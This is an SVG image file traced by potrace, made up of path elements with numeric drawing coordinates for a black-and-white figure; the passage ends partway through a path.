<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
 width="300.000000pt" height="254.000000pt" viewBox="0 0 300.000000 254.000000"
 preserveAspectRatio="xMidYMid meet">
<metadata>
Created by potrace 1.10, written by Peter Selinger 2001-2011
</metadata>
<g transform="translate(0.000000,254.000000) scale(0.100000,-0.100000)"
fill="#000000" stroke="none">
<path d="M1555 2369 c-4 -5 -10 -7 -14 -4 -5 2 -17 -2 -27 -10 -10 -8 -25 -15
-32 -15 -7 0 -25 -9 -41 -20 -23 -18 -32 -19 -57 -10 -50 20 -268 14 -349 -9
-38 -11 -73 -17 -77 -15 -4 3 -8 1 -8 -5 0 -5 -14 -12 -30 -16 -16 -4 -30 -11
-30 -16 0 -19 -49 -8 -67 14 -45 57 -139 68 -198 22 -54 -40 -67 -57 -117
-147 -52 -96 -76 -158 -149 -396 l-54 -173 -35 5 c-20 3 -42 1 -50 -4 -12 -8
-9 -10 10 -10 14 0 68 -9 120 -20 52 -11 115 -19 140 -19 54 2 39 6 -53 14
-57 6 -70 10 -77 28 -7 18 -9 18 -9 5 -1 -10 -8 -18 -17 -18 -12 0 -15 6 -10
23 3 12 14 51 23 87 15 57 18 62 25 40 6 -19 7 -16 3 13 -2 22 0 35 6 32 5 -4
9 3 9 15 0 34 47 190 81 270 60 142 144 251 205 266 38 10 97 -3 115 -25 9
-11 19 -17 23 -14 3 4 12 -7 18 -24 l11 -30 49 28 c91 54 178 74 323 74 72 0
148 -5 170 -12 22 -6 71 -19 109 -29 105 -26 183 -69 251 -139 119 -123 211
-326 223 -487 l5 -78 52 6 c29 4 55 2 58 -3 3 -5 -22 -39 -56 -77 l-60 -68
-23 -126 c-12 -70 -20 -129 -18 -131 7 -7 33 108 40 174 4 44 13 76 23 86 21
21 60 66 89 103 28 37 15 56 -39 56 -47 0 -51 8 -68 120 -11 73 -39 168 -59
206 -6 10 -13 26 -16 34 -7 17 -23 44 -48 79 -10 13 -15 28 -11 34 3 5 2 7 -4
4 -5 -4 -16 5 -23 18 -7 14 -17 25 -22 25 -4 0 -8 4 -8 10 0 12 -48 60 -60 60
-9 0 -21 19 -69 116 -16 33 -36 65 -43 71 -22 17 -47 23 -53 12z m41 -17 c14
-9 34 -47 39 -74 3 -11 11 -28 20 -38 31 -34 13 -35 -52 -4 -37 18 -89 38
-116 45 -46 11 -47 12 -31 30 9 11 22 19 28 19 6 0 5 -5 -2 -12 -7 -7 -12 -16
-12 -21 0 -5 10 3 21 17 30 39 78 56 105 38z"/>
<path d="M1524 2294 c-18 -15 -18 -15 3 -5 27 14 70 14 78 1 3 -5 12 -10 18
-10 7 0 3 7 -7 15 -26 19 -67 19 -92 -1z"/>
<path d="M1198 2293 c17 -2 47 -2 65 0 17 2 3 4 -33 4 -36 0 -50 -2 -32 -4z"/>
<path d="M663 2261 c-118 -85 -206 -332 -201 -561 1 -67 2 -72 5 -25 5 113 25
249 45 315 40 129 110 237 183 282 17 10 25 18 19 18 -6 0 -29 -13 -51 -29z"/>
<path d="M1072 2269 c-76 -30 -60 -32 23 -3 39 13 61 23 50 23 -11 0 -44 -9
-73 -20z"/>
<path d="M810 2219 c0 -17 -19 -45 -57 -84 -64 -66 -103 -137 -128 -235 -24
-93 -55 -275 -55 -326 0 -30 -5 -46 -17 -53 -14 -8 -4 -10 40 -11 52 0 57 -2
57 -22 0 -13 3 -34 7 -48 6 -25 6 -24 -30 7 -39 34 -56 38 -182 48 -43 3 -103
14 -132 24 -29 10 -53 17 -53 15 0 -1 15 -11 33 -23 17 -11 43 -28 57 -37 l25
-16 -25 23 c-18 16 -20 21 -7 16 10 -4 32 -7 48 -7 17 0 32 -6 36 -15 8 -23
-5 -31 -27 -17 -11 7 -20 8 -20 3 0 -13 58 -32 65 -21 3 4 2 15 -1 24 -3 9 -1
16 5 16 6 0 11 -6 11 -14 0 -7 11 -30 25 -51 29 -42 26 -58 -7 -29 -12 10 -18
13 -14 6 9 -15 124 -94 187 -128 21 -12 35 -25 31 -30 -4 -5 0 -3 9 4 13 10
18 8 27 -13 11 -23 10 -25 -16 -25 -29 0 -71 23 -112 60 -64 59 -81 71 -42 30
l42 -46 0 -85 c0 -46 7 -141 15 -209 15 -122 53 -305 61 -297 2 2 -5 48 -16
102 -11 53 -20 128 -20 165 0 38 -4 70 -10 72 -10 3 -27 238 -17 238 4 0 21
-9 39 -20 18 -11 49 -20 68 -20 19 0 30 -4 23 -8 -8 -5 -9 -32 -2 -97 12 -127
18 -155 35 -162 10 -3 14 -21 14 -59 0 -30 5 -54 10 -54 12 0 3 163 -10 195
-17 42 -40 158 -35 175 5 16 -36 116 -54 130 -3 3 -7 14 -7 25 -1 11 -8 57
-14 102 -10 65 -11 101 -1 168 28 200 139 433 268 563 53 53 75 86 29 43 -18
-17 -38 -23 -83 -26 -57 -3 -59 -2 -61 23 -3 34 -12 42 -12 11z m69 -50 l46 2
-29 -30 -29 -30 -31 22 c-17 12 -33 23 -35 24 -1 1 0 7 4 12 3 6 11 8 18 4 6
-3 31 -5 56 -4z m-21 -64 c1 -1 -20 -39 -47 -84 l-50 -82 -3 93 c-2 70 1 97
11 110 14 16 17 16 50 -9 20 -15 37 -27 39 -28z m-114 -97 c-1 -127 -3 -140
-14 -113 -5 11 -7 52 -4 90 3 64 3 67 -7 30 -6 -22 -8 -69 -5 -105 4 -46 1
-80 -11 -117 -15 -49 -33 -70 -33 -40 0 6 -5 51 -10 99 -8 68 -7 96 3 127 16
46 65 131 75 131 4 0 7 -46 6 -102z m-80 -313 c0 -22 -4 -58 -8 -80 -8 -37 -9
-38 -16 -15 -6 21 -6 150 0 230 3 34 23 -85 24 -135z m-41 -1 c-1 -33 3 -85
11 -114 8 -30 12 -57 10 -59 -8 -8 -17 9 -25 46 l-8 38 2 -42 c2 -28 -2 -43
-10 -43 -22 0 -25 20 -17 103 8 82 8 82 15 32 l6 -50 2 55 c2 30 3 75 2 100 0
36 2 40 8 20 4 -14 6 -52 4 -86z m-38 -233 c53 -24 83 -57 67 -73 -19 -19 -14
-33 24 -80 35 -41 36 -43 15 -46 -23 -4 -76 27 -122 70 -14 13 -31 22 -36 21
-6 -2 -14 1 -18 6 -3 6 -2 11 4 11 6 0 -3 21 -19 47 -17 26 -30 51 -30 55 0
15 75 8 115 -11z m89 -103 c3 -13 6 -27 6 -33 -1 -15 -30 27 -30 42 0 22 17
15 24 -9z"/>
<path d="M691 2155 c-45 -63 -106 -196 -140 -307 -28 -92 -66 -286 -58 -294 3
-3 12 39 22 93 31 178 106 384 179 492 45 66 42 79 -3 16z"/>
<path d="M1255 2161 c-94 -23 -186 -102 -254 -219 -48 -82 -91 -204 -96 -276
-5 -53 -2 -47 16 44 31 152 167 312 334 391 33 16 54 29 46 29 -39 0 -166 -78
-251 -155 -44 -40 -44 -40 -24 -8 36 59 118 136 169 159 28 13 75 28 105 33
41 6 46 9 20 9 -19 0 -48 -3 -65 -7z"/>
<path d="M1561 2116 c25 -14 61 -42 79 -63 55 -62 131 -244 130 -310 -1 -10
-13 14 -29 53 -15 39 -45 100 -66 135 -41 67 -130 169 -149 169 -5 0 8 -19 31
-42 51 -53 113 -149 163 -253 42 -85 75 -205 58 -205 -12 0 -174 160 -207 205
l-23 30 23 -40 c36 -64 114 -157 169 -200 46 -37 64 -65 40 -65 -5 0 -44 32
-85 71 -79 75 -148 169 -190 261 -14 29 -23 42 -19 28 3 -14 19 -49 36 -79 43
-77 28 -74 -24 6 -56 86 -69 116 -57 134 5 8 9 19 8 24 0 6 -7 -3 -16 -20 -32
-60 -96 -135 -156 -185 -34 -27 -66 -50 -72 -50 -5 0 16 26 47 58 31 31 61 68
68 82 14 29 8 23 -44 -43 -72 -91 -225 -189 -338 -217 l-48 -12 2 -62 2 -61 3
57 c4 54 6 58 31 63 15 3 61 20 102 37 41 16 80 30 85 29 6 -1 42 -3 82 -4 43
-2 78 -9 90 -18 17 -13 17 -13 2 11 -9 14 -30 34 -47 46 l-31 21 62 49 c33 27
80 72 103 101 l42 51 33 -51 c19 -29 58 -80 87 -115 29 -34 50 -67 47 -72 -3
-5 0 -7 8 -4 8 3 20 -2 27 -11 11 -13 8 -15 -24 -15 -27 0 -35 3 -30 13 5 7 0
6 -11 -3 -17 -14 -14 -15 37 -18 44 -2 60 -8 79 -29 l24 -25 -32 6 c-42 10
-110 -10 -124 -35 -18 -34 -2 -34 36 0 30 26 43 31 80 29 25 -2 45 -5 45 -8 0
-3 20 -15 44 -28 43 -23 43 -24 39 -70 -9 -84 -31 -179 -58 -244 -14 -35 -27
-67 -28 -72 -1 -6 -22 -28 -47 -49 -61 -53 -61 -53 -11 -26 24 13 55 39 69 57
37 48 38 31 3 -34 l-31 -58 26 -21 c36 -29 26 -71 -19 -78 -18 -2 -38 0 -45 6
-10 7 -5 14 20 30 44 26 43 24 28 42 -12 14 -17 12 -50 -20 l-37 -36 -64 11
c-136 24 -138 24 -159 5 -18 -17 -23 -17 -78 -1 -32 9 -74 16 -94 16 -49 0
-269 56 -283 72 -5 7 -6 10 -1 5 6 -4 14 -7 20 -7 5 0 -9 13 -31 29 -44 32
-88 95 -78 111 3 5 2 10 -4 10 -6 0 -7 7 -4 17 5 12 3 14 -7 8 -10 -6 -12 -4
-7 8 3 10 2 17 -4 17 -6 0 -8 9 -4 21 5 16 4 19 -5 14 -10 -6 -12 -1 -8 18 3
15 2 24 -2 22 -13 -8 -23 65 -29 220 -6 146 -7 148 -15 75 -11 -112 16 -300
58 -402 9 -20 13 -38 10 -41 -3 -3 2 -17 11 -31 10 -14 14 -26 10 -26 -4 0 -2
-7 5 -15 7 -8 16 -13 20 -10 4 2 16 -5 26 -17 11 -12 13 -18 4 -13 -8 5 -26
10 -39 11 -32 4 -55 32 -40 50 7 8 7 14 -1 19 -5 3 -10 5 -11 3 -13 -43 -8
-65 19 -80 16 -10 32 -15 35 -12 2 3 22 -2 43 -12 22 -9 46 -18 54 -19 53 -10
161 -44 140 -45 l-25 -2 25 -7 c14 -5 66 -11 115 -15 50 -4 92 -11 93 -17 2
-5 8 -7 13 -4 5 4 17 2 26 -4 17 -9 17 -10 0 -17 -21 -8 -224 1 -249 11 -10 4
-18 11 -18 15 0 5 8 11 18 13 15 4 15 5 0 6 -9 0 -29 -4 -45 -10 l-28 -11 30
-13 c51 -23 194 -38 287 -31 100 7 91 14 108 -99 11 -83 12 -101 4 -92 -11 11
-61 -21 -93 -60 -25 -30 -31 -47 -31 -85 0 -38 3 -48 16 -48 19 0 104 83 104
102 0 11 -70 -47 -78 -64 -9 -20 -22 -4 -22 27 0 41 55 110 89 112 21 2 21 -1
17 -108 -4 -100 -7 -113 -31 -145 -15 -20 -35 -38 -44 -42 -9 -3 -27 -14 -41
-24 -28 -20 -128 -36 -179 -28 -48 7 -60 32 -117 235 -39 142 -47 185 -48 259
l-1 90 34 23 c37 25 36 29 -2 12 -12 -6 -29 -20 -36 -32 -20 -31 -16 -142 7
-222 47 -161 74 -266 70 -271 -6 -6 -201 34 -209 44 -8 9 -36 176 -38 220 0
29 2 32 14 22 10 -8 12 -17 6 -29 -7 -12 0 -26 26 -54 19 -21 37 -37 39 -34 3
2 -1 23 -9 45 -14 41 -89 137 -95 122 -3 -8 21 -199 34 -265 9 -52 -12 -8 -46
95 -17 52 -33 106 -35 120 -2 14 -10 48 -18 75 -9 28 -23 97 -33 155 -19 121
-29 145 -21 49 15 -165 128 -543 171 -571 6 -4 8 -8 4 -8 -16 0 88 -228 118
-260 8 -8 0 12 -17 44 -27 49 -102 247 -96 252 1 1 50 -8 108 -19 l106 -20 19
-41 c25 -51 59 -61 157 -46 38 6 72 9 74 6 6 -6 -38 -66 -49 -66 -4 0 -8 -6
-8 -12 0 -7 -41 -54 -92 -105 l-91 -92 -44 30 c-23 17 -43 35 -43 40 0 6 -4 8
-9 5 -12 -8 -153 141 -197 209 -22 33 -52 99 -68 145 -16 47 -34 88 -40 92 -6
4 -25 46 -43 95 -37 97 -34 61 4 -57 73 -227 241 -452 414 -553 l36 -21 -19
-35 c-11 -20 -13 -28 -6 -17 20 28 74 94 166 203 46 54 93 115 104 137 11 22
31 43 46 49 18 6 50 44 92 108 36 54 71 101 77 103 18 7 223 -31 239 -45 15
-13 74 -135 74 -155 0 -38 -71 4 -108 65 -26 41 -35 48 -59 47 -15 -1 -33 -4
-39 -8 -15 -10 -74 -7 -68 4 3 4 0 8 -5 8 -11 0 -15 -13 -12 -39 2 -7 -2 -10
-8 -7 -5 4 -13 1 -17 -5 -5 -8 -3 -9 6 -4 14 9 9 -13 -22 -82 -14 -32 -23 -42
-31 -34 -11 11 -3 34 30 81 10 14 -1 5 -24 -19 -23 -24 -40 -47 -38 -52 9 -14
99 -60 185 -95 74 -30 94 -45 155 -108 39 -39 61 -61 50 -48 l-20 25 30 -16
c17 -9 43 -25 60 -36 l29 -20 31 62 c28 59 56 124 68 157 2 8 42 65 87 125 45
61 89 124 97 140 16 30 16 30 -4 12 -26 -23 -45 -15 -72 33 -23 41 -35 48 -47
29 -3 -6 -31 -22 -60 -35 -42 -19 -54 -29 -54 -46 -1 -33 -33 -99 -61 -125
-28 -26 -73 -22 -65 6 3 9 15 52 26 96 20 76 24 83 88 142 84 79 103 80 186
18 33 -25 70 -45 82 -45 40 0 73 -18 80 -44 6 -26 14 -31 74 -41 28 -5 40 -15
55 -43 11 -21 37 -46 57 -57 47 -25 54 -45 74 -205 12 -93 22 -136 40 -167 13
-23 24 -52 24 -65 0 -17 3 -19 9 -9 11 16 0 58 -24 95 -10 15 -20 44 -22 64
-2 20 -10 82 -19 137 -8 55 -16 108 -17 117 0 9 -5 14 -9 12 -4 -3 -8 0 -8 6
0 6 -11 15 -25 20 -14 5 -28 16 -31 25 -3 8 -9 13 -13 11 -4 -3 -15 11 -25 29
-15 27 -27 36 -60 42 -34 7 -46 17 -75 60 -20 28 -38 50 -42 48 -3 -3 -17 7
-30 21 -13 14 -64 48 -114 76 -130 74 -193 119 -252 180 l-52 53 -3 77 c-2 42
0 74 5 71 4 -2 7 3 7 12 0 9 7 30 16 47 11 22 13 33 5 41 -8 8 -11 7 -11 -3 0
-25 -48 -120 -81 -161 -17 -22 -28 -39 -25 -39 3 0 21 21 40 46 l35 45 0 -115
1 -115 -38 13 c-28 10 -38 20 -43 42 l-6 29 -5 -30 c-5 -21 -6 -16 -5 17 1 25
-1 44 -6 41 -4 -2 -10 3 -13 11 -3 9 -10 14 -15 11 -4 -3 -3 8 2 25 13 35 34
29 24 -7 -3 -14 -2 -22 3 -19 16 10 21 44 7 50 -11 4 -9 20 9 78 37 119 38
125 11 75 -14 -26 -24 -51 -21 -56 3 -4 -1 -8 -9 -8 -18 0 -19 -3 4 49 23 54
47 161 56 251 7 75 -3 246 -15 228 -3 -6 -6 10 -6 36 2 107 -91 301 -169 354
-22 15 -51 30 -65 34 -14 3 -4 -5 21 -19z m-330 -435 l24 -19 -28 -7 c-28 -7
-112 4 -89 12 6 3 9 10 6 15 -4 7 -2 8 4 4 7 -4 20 -2 29 3 24 14 27 14 54 -8z
m254 -705 c11 -2 47 -7 80 -11 38 -5 68 -15 82 -28 38 -34 64 -122 72 -235 6
-100 6 -103 -14 -98 -11 3 -50 10 -88 16 -78 14 -80 13 -127 -61 -18 -27 -33
-49 -34 -49 0 0 1 53 3 118 3 129 -10 247 -35 294 -13 25 -20 29 -42 24 -20
-5 -23 -4 -12 4 8 5 11 10 5 10 -5 0 -1 7 10 16 12 9 31 12 50 9 16 -3 39 -7
50 -9z m411 -38 c16 -18 27 -37 26 -43 -2 -5 0 -7 4 -3 7 7 40 -13 79 -49 12
-10 27 -19 35 -21 8 -2 29 -14 47 -28 17 -13 36 -24 42 -24 6 0 11 -4 11 -10
0 -5 7 -10 15 -10 23 0 88 -38 114 -68 l24 -27 -22 -3 c-13 -2 -32 5 -45 17
-12 12 -26 21 -30 21 -5 0 -19 12 -33 26 -18 20 -35 26 -72 28 -41 2 -54 8
-74 32 -14 16 -57 54 -96 84 -57 44 -71 60 -71 83 0 35 10 34 46 -5z m-91 -26
c68 -23 81 -31 83 -51 3 -18 6 -21 12 -11 6 10 26 -3 77 -53 55 -55 65 -69 53
-77 -11 -7 -20 -4 -33 13 l-18 22 10 -22 c30 -62 4 -56 -52 12 l-44 54 -7
-132 c-8 -152 -14 -207 -26 -207 -10 0 -27 45 -35 95 -8 49 -29 91 -65 130
-19 22 -30 49 -39 99 -7 38 -21 86 -32 107 -10 21 -19 41 -19 44 0 12 60 2
135 -23z m161 -226 c9 -26 -16 -39 -38 -19 -23 20 -24 6 -1 -19 18 -20 5 -25
-17 -5 -12 10 -12 9 -1 -5 7 -9 9 -23 5 -29 -4 -7 -11 -26 -15 -43 -6 -21 -7
-7 -4 39 3 39 5 93 5 120 l0 50 30 -35 c16 -19 32 -43 36 -54z m-187 -52 l21
-35 -22 7 c-26 8 -38 22 -38 47 0 28 16 20 39 -19z m402 -78 c24 -14 27 -20
19 -37 -10 -18 -23 -27 -18 -11 4 10 -53 84 -60 78 -2 -3 7 -19 22 -36 30 -36
33 -64 10 -87 -12 -12 -18 -13 -27 -4 -9 9 -9 14 2 20 10 7 3 17 -30 41 -24
18 -43 37 -41 42 2 6 -4 8 -13 5 -8 -4 -15 -3 -15 2 0 5 9 11 20 14 11 3 18 1
14 -4 -8 -14 7 -10 41 10 28 17 31 17 38 1 5 -9 22 -24 38 -34z m-61 -111 c11
-20 8 -28 -26 -74 -21 -28 -41 -51 -44 -51 -3 1 -17 17 -32 37 -23 29 -27 43
-24 82 2 25 7 54 10 64 3 9 8 25 11 34 5 13 14 8 49 -26 24 -24 49 -53 56 -66z
m-531 -4 c-20 -48 -44 -79 -54 -70 -5 6 41 107 58 127 21 25 19 -5 -4 -57z
m111 48 c0 -21 -63 -130 -71 -122 -4 4 -2 36 3 71 10 59 12 62 39 62 16 0 29
-5 29 -11z m50 -29 c13 -21 40 -47 60 -57 19 -10 37 -19 39 -20 8 -5 -62 -103
-73 -103 -6 0 -32 20 -56 45 -24 24 -46 43 -48 40 -8 -7 88 -95 103 -95 8 0
21 -12 29 -27 17 -32 21 -25 5 9 -8 20 -4 33 27 86 32 54 41 62 60 58 13 -4
26 -2 29 4 11 17 24 11 39 -19 11 -21 12 -31 4 -39 -9 -9 -16 -5 -30 16 -10
15 -18 22 -18 17 0 -6 7 -20 15 -32 9 -13 11 -24 6 -28 -6 -3 -17 8 -26 24 -8
16 -19 32 -24 35 -5 4 4 -18 20 -46 32 -60 35 -76 15 -103 -13 -18 -16 -16
-46 33 -17 29 -34 52 -36 52 -6 0 -3 -5 34 -64 19 -31 21 -38 8 -33 -10 4 -15
3 -11 -3 9 -15 36 -12 57 7 11 10 18 30 18 54 0 26 7 46 24 63 l23 26 18 -40
c11 -24 15 -49 11 -65 l-7 -26 -32 22 -32 22 29 -30 28 -31 -26 -58 -26 -57
-23 20 c-38 33 -75 53 -91 47 -8 -3 -16 1 -18 11 -2 14 -165 126 -200 137 -8
3 4 28 29 66 23 34 44 75 48 92 4 16 10 30 13 30 4 0 18 -18 32 -40z m-122
-105 c1 -1 -6 -12 -16 -24 -17 -22 -18 -23 -55 -5 -41 19 -46 30 -19 37 15 4
82 -2 90 -8z"/>
<path d="M1820 280 c0 -5 6 -15 13 -22 8 -7 12 -20 10 -28 -3 -9 4 -23 14 -30
15 -12 16 -12 6 0 -17 18 -17 44 -1 34 7 -4 2 7 -11 24 -23 33 -31 39 -31 22z"/>
<path d="M897 2028 c-88 -141 -125 -281 -111 -424 l8 -89 7 135 c8 157 34 253
98 363 47 79 45 90 -2 15z"/>
<path d="M1410 2054 c0 -19 -80 -133 -136 -194 -65 -69 -159 -140 -228 -171
-55 -24 -62 -36 -8 -14 79 34 130 71 222 164 89 91 171 204 156 218 -3 3 -6 2
-6 -3z"/>
<path d="M1749 1945 c42 -88 68 -178 80 -285 6 -52 13 -111 15 -130 3 -19 3 8
1 62 -6 148 -51 311 -108 389 -9 13 -4 -3 12 -36z"/>
<path d="M1916 1660 c14 -92 23 -264 15 -274 -15 -19 -23 -74 -12 -81 6 -3 12
-3 12 2 1 4 4 19 7 33 11 51 3 245 -12 300 -9 30 -13 39 -10 20z"/>
<path d="M809 1580 c-4 -104 16 -238 42 -279 8 -14 9 -13 5 4 -24 92 -30 137
-36 250 l-6 130 -5 -105z"/>
<path d="M859 1625 c-21 -142 39 -457 101 -535 13 -17 10 -4 -10 37 -32 65
-64 191 -54 216 3 8 0 35 -7 58 -6 24 -15 94 -18 154 -5 79 -8 99 -12 70z"/>
<path d="M688 1552 c-4 -35 -3 -94 2 -132 10 -70 44 -177 63 -195 10 -10 9 -5
-8 38 -6 13 -3 16 9 11 9 -3 14 -10 11 -14 -3 -4 2 -10 10 -13 12 -5 12 -2 3
18 -6 13 -14 22 -18 20 -15 -10 -30 23 -29 66 0 24 -4 69 -10 99 -10 52 -10
50 -5 -30 3 -46 2 -81 -3 -77 -4 4 -9 67 -12 140 -6 121 -7 127 -13 69z"/>
<path d="M1073 1580 c-34 -14 -28 -20 9 -9 18 5 52 9 76 9 36 0 48 -5 72 -32
31 -33 46 -33 36 0 -4 11 -21 25 -38 31 -37 13 -124 13 -155 1z"/>
<path d="M225 1527 c10 -15 26 -32 36 -37 19 -11 19 -51 -1 -100 -5 -14 -19
-79 -31 -145 -48 -275 -16 -604 77 -787 20 -40 21 -48 9 -58 -8 -7 -15 -19
-15 -27 0 -8 -3 -12 -8 -9 -4 2 -23 -8 -42 -24 l-35 -29 -4 -155 c-2 -92 1
-156 6 -156 6 0 10 63 11 144 0 80 5 153 10 163 6 10 27 27 46 37 30 16 39 17
49 6 10 -10 9 -12 -3 -6 -8 4 2 -8 23 -27 20 -19 37 -37 37 -41 0 -3 24 -39
54 -80 30 -40 73 -101 94 -135 28 -45 41 -58 45 -47 4 9 1 15 -6 13 -7 -1 -11
6 -10 16 0 10 -2 16 -5 13 -5 -5 -152 208 -152 220 0 3 5 2 10 -1 6 -4 -10 26
-36 65 -124 193 -172 397 -161 685 8 182 55 435 81 435 6 0 46 -25 89 -56 l77
-55 0 -142 c0 -131 22 -342 36 -356 4 -3 3 12 0 34 -26 160 -35 462 -14 449 7
-4 8 -3 4 5 -4 6 -56 44 -114 83 -59 39 -122 85 -141 102 l-34 31 18 -28z
m133 -1160 c11 -19 27 -46 37 -60 29 -45 9 -30 -26 18 -18 25 -38 45 -46 45
-17 0 -17 17 0 23 6 3 13 6 14 6 0 1 10 -14 21 -32z"/>
<path d="M2021 1539 c-14 -5 -31 -7 -38 -5 -10 4 -13 -7 -12 -42 1 -45 1 -45
9 -14 4 18 11 36 15 40 5 4 5 -2 1 -13 -6 -16 -1 -14 23 9 28 26 36 37 29 35
-2 0 -14 -5 -27 -10z"/>
<path d="M1166 1505 c-3 -8 -17 -15 -31 -15 -15 0 -24 4 -20 10 3 6 1 10 -4
10 -6 0 -11 -4 -11 -10 0 -5 -19 -10 -42 -10 -30 0 -39 -3 -29 -9 23 -15 -29
-24 -62 -12 -36 14 -26 -2 10 -18 16 -7 42 -30 58 -51 17 -22 36 -39 43 -40 8
0 0 14 -17 31 -38 37 -39 52 -6 67 35 16 36 16 29 -13 -5 -21 -3 -25 14 -25
12 0 24 5 27 10 3 6 -1 10 -9 10 -10 0 -13 6 -9 16 9 23 87 15 91 -10 3 -12 0
-16 -8 -11 -8 5 -8 1 1 -13 18 -29 -5 -56 -41 -49 -14 3 -32 2 -40 -4 -16 -9
-15 -10 48 -12 29 -2 41 1 38 10 -3 6 2 17 10 23 8 7 14 24 14 38 l0 26 28
-27 c37 -36 53 -35 19 1 -15 16 -24 32 -20 37 5 4 2 5 -4 1 -12 -7 -18 6 -14
28 1 5 -4 4 -12 -2 -18 -15 -48 -5 -40 14 3 8 3 14 0 14 -3 0 -7 -7 -11 -15z"/>
<path d="M1610 1501 c-5 -11 -18 -22 -29 -26 -10 -3 -31 -25 -47 -48 -17 -26
-21 -36 -9 -27 10 8 25 15 34 15 9 0 15 7 13 16 -2 16 35 39 63 39 19 0 29
-20 17 -32 -6 -6 -8 -16 -6 -22 3 -7 -5 -21 -16 -31 -17 -16 -24 -17 -40 -7
-25 15 -27 15 -27 -3 0 -17 -2 -16 50 -19 23 -1 36 2 33 9 -2 6 2 19 10 30 8
10 14 31 14 47 0 29 17 37 38 16 8 -8 8 -17 1 -30 -6 -11 -8 -22 -5 -25 3 -3
10 6 17 20 6 14 21 28 33 32 22 7 19 9 -28 20 -22 5 -26 9 -17 18 6 6 11 16
11 22 0 5 -5 2 -11 -7 -5 -10 -19 -18 -29 -18 -14 0 -18 5 -14 18 5 16 5 16
-9 0 -17 -22 -41 -24 -33 -3 8 22 -1 19 -14 -4z"/>
<path d="M1806 1404 c-3 -44 -8 -106 -11 -140 -3 -33 -12 -83 -20 -109 -8 -27
-12 -51 -10 -53 2 -2 13 26 24 62 25 83 47 277 33 301 -7 13 -11 -3 -16 -61z"/>
<path d="M901 1434 c0 -17 6 -53 14 -80 18 -61 18 -92 0 -44 -19 50 -18 23 1
-34 24 -70 58 -126 100 -166 36 -34 37 -34 17 -5 -56 82 -106 216 -126 335 -4
22 -4 21 -6 -6z"/>
<path d="M1147 1454 c-11 -11 -8 -44 3 -44 15 0 24 30 13 41 -5 5 -12 6 -16 3z"/>
<path d="M1594 1439 c-10 -17 13 -36 27 -22 12 12 4 33 -11 33 -5 0 -12 -5
-16 -11z"/>
<path d="M341 1343 c-30 -193 -45 -445 -33 -553 9 -73 9 -74 11 -21 1 67 9 63
15 -10 3 -29 12 -92 20 -139 8 -47 13 -86 11 -88 -6 -7 -65 157 -80 224 -8 38
-19 105 -24 149 l-8 80 -1 -90 c-2 -115 12 -211 44 -305 26 -78 83 -195 84
-172 0 21 20 13 20 -9 0 -13 -4 -18 -12 -13 -7 4 -5 -1 4 -12 17 -20 49 -99
46 -112 -3 -9 33 -64 39 -59 2 2 -6 26 -17 52 -31 71 -68 211 -91 343 -27 146
-38 546 -20 698 13 112 8 137 -8 37z m-40 -680 c12 -38 37 -101 56 -142 19
-42 30 -78 25 -83 -16 -16 -80 146 -106 265 -11 49 2 28 25 -40z"/>
<path d="M1441 1336 c-1 -5 4 -26 10 -46 9 -28 9 -47 1 -69 l-11 -31 34 26
c21 16 35 35 35 48 0 25 -36 69 -50 61 -4 -3 -11 1 -13 7 -3 7 -6 9 -6 4z m42
-65 c-2 -15 1 -20 10 -15 8 5 8 2 -2 -9 -7 -9 -16 -17 -19 -17 -3 0 -3 3 0 6
4 3 2 19 -2 35 -7 22 -6 29 3 26 7 -2 11 -14 10 -26z"/>
<path d="M1894 1190 c-9 -22 -20 -40 -25 -40 -17 0 -9 -22 29 -78 53 -81 154
-185 247 -255 44 -33 95 -74 114 -91 l35 -31 -25 31 c-13 17 -44 46 -69 65
-25 19 -55 45 -67 58 -13 13 -23 20 -23 16 0 -15 -177 171 -185 193 -3 12 -11
22 -16 22 -5 0 -9 7 -9 15 0 8 -5 15 -11 15 -13 0 -8 30 15 83 9 20 14 37 11
37 -3 0 -12 -18 -21 -40z"/>
<path d="M1257 1099 c29 -29 151 -37 198 -13 17 8 21 11 10 8 -45 -15 -122
-15 -169 0 -27 8 -44 10 -39 5z"/>
<path d="M453 900 c3 -14 11 -54 17 -90 18 -104 68 -299 100 -395 36 -107 37
-111 5 -60 -44 71 -116 255 -146 369 -15 61 -28 102 -29 91 0 -11 11 -60 24
-110 16 -60 25 -131 29 -210 8 -177 36 -285 98 -375 27 -39 49 -75 49 -79 0
-15 39 -43 55 -39 13 2 9 13 -22 58 -61 87 -58 95 11 29 108 -102 111 -102 56
14 -83 176 -163 435 -220 711 -11 55 -23 102 -27 105 -3 3 -3 -5 0 -19z m118
-619 c22 -41 65 -112 96 -158 31 -46 54 -86 51 -88 -7 -7 -166 160 -201 212
-22 32 -32 64 -43 135 -8 51 -14 113 -13 138 0 42 2 39 35 -60 19 -57 53 -138
75 -179z m18 27 c19 -30 51 -95 51 -104 0 -10 -52 69 -54 82 -1 7 -8 19 -15
28 -7 9 -9 16 -5 16 5 0 16 -10 23 -22z m-13 -156 c-10 -9 -61 41 -68 66 -6
24 -3 22 33 -17 22 -24 37 -46 35 -49z"/>
<path d="M596 635 c6 -93 47 -290 79 -390 28 -87 103 -250 111 -242 3 3 -2 20
-11 39 l-16 33 34 -38 c48 -52 56 -46 11 8 -21 24 -42 41 -48 38 -6 -3 -8 -3
-4 2 4 4 -6 30 -22 59 -38 68 -101 284 -79 270 5 -3 9 -13 9 -23 0 -9 13 -43
29 -74 16 -31 27 -58 25 -60 -3 -2 2 -10 11 -17 8 -7 15 -22 15 -33 0 -11 3
-17 6 -14 4 4 16 -10 27 -31 30 -56 110 -161 125 -162 7 0 -8 25 -33 55 -125
154 -219 362 -259 570 l-15 80 5 -70z"/>
<path d="M2326 482 c-8 -16 -39 -48 -69 -71 -30 -23 -67 -60 -83 -82 -15 -22
-41 -51 -57 -65 -15 -13 -24 -24 -19 -24 6 0 31 23 56 51 35 39 46 47 46 31 0
-11 -7 -26 -16 -33 -28 -23 -115 -152 -107 -158 5 -3 21 -25 37 -48 16 -24 33
-40 39 -36 6 4 8 0 4 -10 -6 -16 6 -30 31 -33 16 -3 8 10 -50 78 l-49 57 23
41 c13 23 28 38 36 35 7 -3 10 0 7 5 -3 5 6 26 22 46 l27 37 14 -33 c7 -19 27
-53 44 -78 30 -43 36 -45 80 -27 11 4 18 0 23 -14 14 -44 31 -51 80 -35 24 9
